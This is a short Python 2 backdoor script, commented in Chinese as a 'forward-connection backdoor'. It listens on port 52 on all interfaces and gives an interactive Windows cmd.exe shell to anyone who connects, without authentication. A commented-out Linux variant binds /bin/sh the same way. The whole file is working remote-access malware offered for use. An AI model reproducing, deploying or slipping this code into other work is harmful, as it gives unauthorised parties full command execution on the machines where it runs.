from socket import *
import subprocess
import os, threading
'''
it work!
python正向连接后门
https://www.leavesongs.com/PYTHON/python-shell-backdoor.html
linux version:
from socket import *
import subprocess
import os, threading, sys, time

if __name__ == "__main__":
        server=socket(AF_INET,SOCK_STREAM)
        server.bind(('0.0.0.0',52))
        server.listen(5)
        print 'waiting for connect'
        talk, addr = server.accept()
        print 'connect from',addr
        proc = subprocess.Popen(["/bin/sh","-i"], stdin=talk,
                stdout=talk, stderr=talk, shell=True)
'''

def send(talk, proc):
        import time
        while True:
                msg = proc.stdout.readline()
                talk.send(msg)

if __name__ == "__main__":
        server=socket(AF_INET,SOCK_STREAM)
        server.bind(('0.0.0.0',52))
        server.listen(5)
        print 'waiting for connect'
        talk, addr = server.accept()
        print 'connect from',addr
        proc = subprocess.Popen('cmd.exe /K', stdin=subprocess.PIPE,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        t = threading.Thread(target = send, args = (talk, proc))
        t.setDaemon(True)
        t.start()
        while True:
                cmd=talk.recv(1024)
                proc.stdin.write(cmd)
                proc.stdin.flush()
        server.close()
